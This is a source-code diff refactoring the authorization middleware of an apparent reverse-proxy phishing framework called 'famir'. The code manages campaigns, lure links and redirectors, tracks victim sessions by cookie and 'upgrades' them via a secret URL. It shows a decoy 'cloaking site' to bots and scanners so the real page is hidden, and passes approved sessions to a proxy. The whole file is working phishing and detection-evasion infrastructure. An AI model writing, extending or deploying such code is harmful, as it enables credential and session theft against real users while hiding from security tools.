@@ -6,12 +6,7 @@ import {
   FullRedirectorModel,
   SessionModel
 } from '@famir/database'
-import {
-  HTTP_SERVER_ROUTER,
-  HttpServerContext,
-  HttpServerNextFunction,
-  HttpServerRouter
-} from '@famir/http-server'
+import { HTTP_SERVER_ROUTER, HttpServerContext, HttpServerRouter } from '@famir/http-server'
 import { HttpCookie } from '@famir/http-tools'
 import { Logger, LOGGER } from '@famir/logger'
 import { TEMPLATER, Templater } from '@famir/templater'
@@ -29,11 +24,23 @@ import {
   type UpgradeSessionUseCase
 } from '../../use-cases/index.js'
 import { BaseController } from '../base/index.js'
-import { AUTHORIZE_CONTROLLER, LandingLurePayload, LandingUpgradePayload } from './authorize.js'
+import {
+  AUTHORIZE_CONTROLLER,
+  AuthorizeDispatchAccessLevel,
+  AuthorizeDispatchContextType,
+  LandingLurePayload,
+  LandingUpgradePayload
+} from './authorize.js'
 import { authorizeSchemas } from './authorize.schemas.js'
 
+/*
+ * Authorize controller
+ */
 export class AuthorizeController extends BaseController {
-  static inject(container: DIContainer) {
+  /*
+   * Register dependency
+   */
+  static register(container: DIContainer) {
     container.registerSingleton(
       AUTHORIZE_CONTROLLER,
       (c) =>
@@ -51,6 +58,9 @@ export class AuthorizeController extends BaseController {
     )
   }
 
+  /*
+   * Resolve dependency
+   */
   static resolve(container: DIContainer): AuthorizeController {
     return container.resolve(AUTHORIZE_CONTROLLER)
   }
@@ -73,255 +83,311 @@ export class AuthorizeController extends BaseController {
     this.logger.debug(`AuthorizeController initialized`)
   }
 
+  /*
+   * Use middleware
+   */
   use() {
     this.router.addMiddleware('authorize', async (ctx, next) => {
       const campaign = this.getState(ctx, 'campaign')
       const target = this.getState(ctx, 'target')
 
-      if (target.isLanding) {
-        if (ctx.url.isPath(campaign.landingUpgradePath)) {
-          await this.landingUpgradeSession(ctx, campaign, target)
+      await this.dispatchRoot[ctx.type](ctx, campaign, target, next)
+    })
+  }
 
-          return
-        }
+  protected dispatchRoot: AuthorizeDispatchContextType = {
+    normal: async (ctx, campaign, target, next) => {
+      await this.dispatchNormal[target.accessLevel](ctx, campaign, target, next)
+    },
 
-        const lureRedirector = await this.findLureRedirectorUseCase.execute({
-          campaignId: campaign.campaignId,
-          path: ctx.url.get('pathname')
-        })
+    websocket: async (ctx, campaign, target, next) => {
+      await this.dispatchWebSocket[target.accessLevel](ctx, campaign, target, next)
+    }
+  }
 
-        if (lureRedirector) {
-          await this.landingLureSession(ctx, campaign, target, lureRedirector)
+  protected dispatchNormal: AuthorizeDispatchAccessLevel = {
+    transparent: async (ctx, campaign, target, next) => {
+      if (ctx.isBot) {
+        await this.sendCloakingSite(ctx, target)
 
-          return
-        }
-
-        await this.landingAuthSession(ctx, campaign, target, next)
-      } else {
-        await this.transparentSession(ctx, campaign, target, next)
+        return
       }
-    })
-  }
 
-  protected async landingUpgradeSession(
-    ctx: HttpServerContext,
-    campaign: FullCampaignModel,
-    target: EnabledFullTargetModel
-  ): Promise<void> {
-    if (!ctx.method.is('GET')) {
-      await this.sendNotFoundPage(ctx, target)
+      let session: SessionModel | null = null
 
-      return
-    }
+      const sessionCookie = this.getSessionCookie(ctx, campaign)
+      if (sessionCookie && this.checkSessionCookie(sessionCookie)) {
+        session = await this.authSessionUseCase.execute({
+          campaignId: campaign.campaignId,
+          sessionId: sessionCookie
+        })
+      }
 
-    const upgradePayload = this.parseLandingUpgradePayload(ctx, campaign)
-    if (!upgradePayload) {
-      await this.sendNotFoundPage(ctx, target)
-
-      return
-    }
-
-    if (ctx.isBot) {
-      await this.sendNotFoundPage(ctx, target)
-
-      return
-    }
-
-    const isOkey = await this.upgradeSessionUseCase.execute({
-      campaignId: campaign.campaignId,
-      lureId: upgradePayload.lure_id,
-      sessionId: upgradePayload.session_id,
-      secret: upgradePayload.secret
-    })
-
-    if (!isOkey) {
-      await this.sendNotFoundPage(ctx, target)
-
-      return
-    }
-
-    await this.sendRedirectTo(ctx, upgradePayload.back_url)
-  }
-
-  protected async landingLureSession(
-    ctx: HttpServerContext,
-    campaign: FullCampaignModel,
-    target: EnabledFullTargetModel,
-    lureRedirector: [EnabledLureModel, FullRedirectorModel]
-  ): Promise<void> {
-    if (!ctx.method.is(['GET', 'HEAD'])) {
-      await this.sendNotFoundPage(ctx, target)
-
-      return
-    }
-
-    const lurePayload = this.parseLandingLurePayload(ctx, campaign)
-    if (!lurePayload) {
-      await this.sendNotFoundPage(ctx, target)
-
-      return
-    }
-
-    if (ctx.isBot) {
-      await this.sendRedirectorPage(ctx, campaign, target, lureRedirector, null, lurePayload)
-
-      return
-    }
-
-    const sessionCookie = this.getSessionCookie(ctx, campaign)
-    if (!sessionCookie) {
-      const session = await this.createSessionUseCase.execute({
-        campaignId: campaign.campaignId
-      })
+      if (!session) {
+        session = await this.createSessionUseCase.execute({
+          campaignId: campaign.campaignId
+        })
+      }
 
       this.persistSessionCookie(ctx, campaign, session)
 
-      await this.sendOriginRedirect(ctx)
-
-      return
-    }
-
-    if (!this.checkSessionCookie(sessionCookie)) {
-      this.removeSessionCookie(ctx, campaign)
-
-      await this.sendOriginRedirect(ctx)
-
-      return
-    }
-
-    const session = await this.authSessionUseCase.execute({
-      campaignId: campaign.campaignId,
-      sessionId: sessionCookie
-    })
-
-    if (!session) {
-      this.removeSessionCookie(ctx, campaign)
-
-      await this.sendOriginRedirect(ctx)
-
-      return
-    }
-
-    this.persistSessionCookie(ctx, campaign, session)
-
-    await this.sendRedirectorPage(ctx, campaign, target, lureRedirector, session, lurePayload)
-  }
-
-  protected async landingAuthSession(
-    ctx: HttpServerContext,
-    campaign: FullCampaignModel,
-    target: EnabledFullTargetModel,
-    next: HttpServerNextFunction
-  ): Promise<void> {
-    if (ctx.isBot) {
-      await this.sendCloakingSite(ctx, target)
-
-      return
-    }
-
-    const sessionCookie = this.getSessionCookie(ctx, campaign)
-    if (!sessionCookie) {
-      await this.sendCloakingSite(ctx, target)
-
-      return
-    }
-
-    if (!this.checkSessionCookie(sessionCookie)) {
-      this.removeSessionCookie(ctx, campaign)
-
-      await this.sendOriginRedirect(ctx)
-
-      return
-    }
-
-    const session = await this.authSessionUseCase.execute({
-      campaignId: campaign.campaignId,
-      sessionId: sessionCookie
-    })
-
-    if (!session) {
-      this.removeSessionCookie(ctx, campaign)
-
-      await this.sendOriginRedirect(ctx)
-
-      return
-    }
-
-    this.persistSessionCookie(ctx, campaign, session)
-
-    if (!session.isLanding) {
-      await this.sendCloakingSite(ctx, target)
-
-      return
-    }
-
-    const proxy = await this.readProxyUseCase.execute({
-      campaignId: campaign.campaignId,
-      proxyId: session.proxyId
-    })
-
-    this.setState(ctx, 'proxy', proxy)
-    this.setState(ctx, 'session', session)
-
-    if (ctx.verbose) {
-      ctx.responseHeaders.merge({
-        'X-Famir-Session-Id': session.sessionId,
-        'X-Famir-Proxy-Id': proxy.proxyId
+      const proxy = await this.readProxyUseCase.execute({
+        campaignId: campaign.campaignId,
+        proxyId: session.proxyId
       })
-    }
 
-    await next()
-  }
+      this.setState(ctx, 'proxy', proxy)
+      this.setState(ctx, 'session', session)
 
-  protected async transparentSession(
-    ctx: HttpServerContext,
-    campaign: FullCampaignModel,
-    target: EnabledFullTargetModel,
-    next: HttpServerNextFunction
-  ): Promise<void> {
-    if (ctx.isBot) {
-      await this.sendCloakingSite(ctx, target)
+      if (ctx.state.verbose) {
+        ctx.responseHeaders.merge({
+          'X-Famir-Session-Id': session.sessionId,
+          'X-Famir-Proxy-Id': proxy.proxyId
+        })
+      }
 
-      return
-    }
+      await next()
+    },
 
-    let session: SessionModel | null = null
+    landing: async (ctx, campaign, target, next) => {
+      if (ctx.url.isPath(campaign.landingUpgradePath)) {
+        if (!ctx.method.is('GET')) {
+          await this.sendNotFoundPage(ctx, target)
 
-    const sessionCookie = this.getSessionCookie(ctx, campaign)
-    if (sessionCookie && this.checkSessionCookie(sessionCookie)) {
-      session = await this.authSessionUseCase.execute({
+          return
+        }
+
+        const upgradePayload = this.parseLandingUpgradePayload(ctx, campaign)
+        if (!upgradePayload) {
+          await this.sendNotFoundPage(ctx, target)
+
+          return
+        }
+
+        if (ctx.isBot) {
+          await this.sendNotFoundPage(ctx, target)
+
+          return
+        }
+
+        const ok = await this.upgradeSessionUseCase.execute({
+          campaignId: campaign.campaignId,
+          lureId: upgradePayload.lure_id,
+          sessionId: upgradePayload.session_id,
+          secret: upgradePayload.secret
+        })
+
+        if (!ok) {
+          await this.sendNotFoundPage(ctx, target)
+
+          return
+        }
+
+        await this.sendRedirectTo(ctx, upgradePayload.back_url)
+
+        return
+      }
+
+      const lureRedirector = await this.findLureRedirectorUseCase.execute({
+        campaignId: campaign.campaignId,
+        path: ctx.url.get('pathname')
+      })
+
+      if (lureRedirector) {
+        if (!ctx.method.is(['GET', 'HEAD'])) {
+          await this.sendNotFoundPage(ctx, target)
+
+          return
+        }
+
+        const lurePayload = this.parseLandingLurePayload(ctx, campaign)
+        if (!lurePayload) {
+          await this.sendNotFoundPage(ctx, target)
+
+          return
+        }
+
+        if (ctx.isBot) {
+          await this.sendRedirectorPage(ctx, campaign, target, lureRedirector, null, lurePayload)
+
+          return
+        }
+
+        const sessionCookie = this.getSessionCookie(ctx, campaign)
+        if (!sessionCookie) {
+          const session = await this.createSessionUseCase.execute({
+            campaignId: campaign.campaignId
+          })
+
+          this.persistSessionCookie(ctx, campaign, session)
+
+          await this.sendOriginRedirect(ctx)
+
+          return
+        }
+
+        if (!this.checkSessionCookie(sessionCookie)) {
+          this.removeSessionCookie(ctx, campaign)
+
+          await this.sendOriginRedirect(ctx)
+
+          return
+        }
+
+        const session = await this.authSessionUseCase.execute({
+          campaignId: campaign.campaignId,
+          sessionId: sessionCookie
+        })
+
+        if (!session) {
+          this.removeSessionCookie(ctx, campaign)
+
+          await this.sendOriginRedirect(ctx)
+
+          return
+        }
+
+        this.persistSessionCookie(ctx, campaign, session)
+
+        await this.sendRedirectorPage(ctx, campaign, target, lureRedirector, session, lurePayload)
+
+        return
+      }
+
+      if (ctx.isBot) {
+        await this.sendCloakingSite(ctx, target)
+
+        return
+      }
+
+      const sessionCookie = this.getSessionCookie(ctx, campaign)
+      if (!sessionCookie) {
+        await this.sendCloakingSite(ctx, target)
+
+        return
+      }
+
+      if (!this.checkSessionCookie(sessionCookie)) {
+        this.removeSessionCookie(ctx, campaign)
+
+        await this.sendOriginRedirect(ctx)
+
+        return
+      }
+
+      const session = await this.authSessionUseCase.execute({
         campaignId: campaign.campaignId,
         sessionId: sessionCookie
       })
-    }
 
-    if (!session) {
-      session = await this.createSessionUseCase.execute({
-        campaignId: campaign.campaignId
+      if (!session) {
+        this.removeSessionCookie(ctx, campaign)
+
+        await this.sendOriginRedirect(ctx)
+
+        return
+      }
+
+      this.persistSessionCookie(ctx, campaign, session)
+
+      if (!session.isUpgraded) {
+        await this.sendCloakingSite(ctx, target)
+
+        return
+      }
+
+      const proxy = await this.readProxyUseCase.execute({
+        campaignId: campaign.campaignId,
+        proxyId: session.proxyId
       })
+
+      this.setState(ctx, 'proxy', proxy)
+      this.setState(ctx, 'session', session)
+
+      if (ctx.state.verbose) {
+        ctx.responseHeaders.merge({
+          'X-Famir-Session-Id': session.sessionId,
+          'X-Famir-Proxy-Id': proxy.proxyId
+        })
+      }
+
+      await next()
     }
-
-    this.persistSessionCookie(ctx, campaign, session)
-
-    const proxy = await this.readProxyUseCase.execute({
-      campaignId: campaign.campaignId,
-      proxyId: session.proxyId
-    })
-
-    this.setState(ctx, 'proxy', proxy)
-    this.setState(ctx, 'session', session)
-
-    if (ctx.verbose) {
-      ctx.responseHeaders.merge({
-        'X-Famir-Session-Id': session.sessionId,
-        'X-Famir-Proxy-Id': proxy.proxyId
-      })
-    }
-
-    await next()
   }
 
-  private getSessionCookie(
+  protected dispatchWebSocket: AuthorizeDispatchAccessLevel = {
+    transparent: async (ctx, campaign, target, next) => {
+      if (ctx.isBot) {
+        ctx.close()
+
+        return
+      }
+
+      let session: SessionModel | null = null
+
+      const sessionCookie = this.getSessionCookie(ctx, campaign)
+      if (sessionCookie && this.checkSessionCookie(sessionCookie)) {
+        session = await this.authSessionUseCase.execute({
+          campaignId: campaign.campaignId,
+          sessionId: sessionCookie
+        })
+      }
+
+      if (!session) {
+        session = await this.createSessionUseCase.execute({
+          campaignId: campaign.campaignId
+        })
+      }
+
+      const proxy = await this.readProxyUseCase.execute({
+        campaignId: campaign.campaignId,
+        proxyId: session.proxyId
+      })
+
+      this.setState(ctx, 'proxy', proxy)
+      this.setState(ctx, 'session', session)
+
+      await next()
+    },
+
+    landing: async (ctx, campaign, target, next) => {
+      if (ctx.isBot) {
+        ctx.close()
+
+        return
+      }
+
+      const sessionCookie = this.getSessionCookie(ctx, campaign)
+      if (!sessionCookie || !this.checkSessionCookie(sessionCookie)) {
+        ctx.close()
+
+        return
+      }
+
+      const session = await this.authSessionUseCase.execute({
+        campaignId: campaign.campaignId,
+        sessionId: sessionCookie
+      })
+
+      if (!session || !session.isUpgraded) {
+        ctx.close()
+
+        return
+      }
+
+      const proxy = await this.readProxyUseCase.execute({
+        campaignId: campaign.campaignId,
+        proxyId: session.proxyId
+      })
+
+      this.setState(ctx, 'proxy', proxy)
+      this.setState(ctx, 'session', session)
+
+      await next()
+    }
+  }
+
+  protected getSessionCookie(
     ctx: HttpServerContext,
     campaign: FullCampaignModel
   ): HttpCookie | undefined {
@@ -330,15 +396,19 @@ export class AuthorizeController extends BaseController {
     return cookies ? cookies[campaign.sessionCookieName] : undefined
   }
 
-  private checkSessionCookie(value: unknown): value is string {
+  protected checkSessionCookie(value: unknown): value is string {
     return this.validator.guardSchema<string>('reverse-session-cookie', value)
   }
 
-  private persistSessionCookie(
+  protected persistSessionCookie(
     ctx: HttpServerContext,
     campaign: FullCampaignModel,
     session: SessionModel
   ) {
+    if (ctx.type !== 'normal') {
+      throw new Error(`Only 'normal' context type allowed`)
+    }
+
     const setCookies = ctx.responseHeaders.getSetCookies() ?? {}
 
     setCookies[campaign.sessionCookieName] = {
@@ -352,7 +422,11 @@ export class AuthorizeController extends BaseController {
     ctx.responseHeaders.setSetCookies(setCookies)
   }
 
-  private removeSessionCookie(ctx: HttpServerContext, campaign: FullCampaignModel) {
+  protected removeSessionCookie(ctx: HttpServerContext, campaign: FullCampaignModel) {
+    if (ctx.type !== 'normal') {
+      throw new Error(`Only 'normal' context type allowed`)
+    }
+
     const setCookies = ctx.responseHeaders.getSetCookies() ?? {}
 
     setCookies[campaign.sessionCookieName] = {
@@ -366,7 +440,7 @@ export class AuthorizeController extends BaseController {
     ctx.responseHeaders.setSetCookies(setCookies)
   }
 
-  private parseLandingUpgradePayload(
+  protected parseLandingUpgradePayload(
     ctx: HttpServerContext,
     campaign: FullCampaignModel
   ): LandingUpgradePayload | null {
@@ -388,7 +462,7 @@ export class AuthorizeController extends BaseController {
     }
   }
 
-  private parseLandingLurePayload(
+  protected parseLandingLurePayload(
     ctx: HttpServerContext,
     campaign: FullCampaignModel
   ): LandingLurePayload | null {
@@ -429,6 +503,10 @@ export class AuthorizeController extends BaseController {
     session: SessionModel | null,
     lurePayload: LandingLurePayload
   ): Promise<void> {
+    if (ctx.type !== 'normal') {
+      throw new Error(`Only 'normal' context type allowed`)
+    }
+
     if (ctx.method.is(['GET', 'HEAD'])) {
       const [lure, redirector] = lureRedirector
 
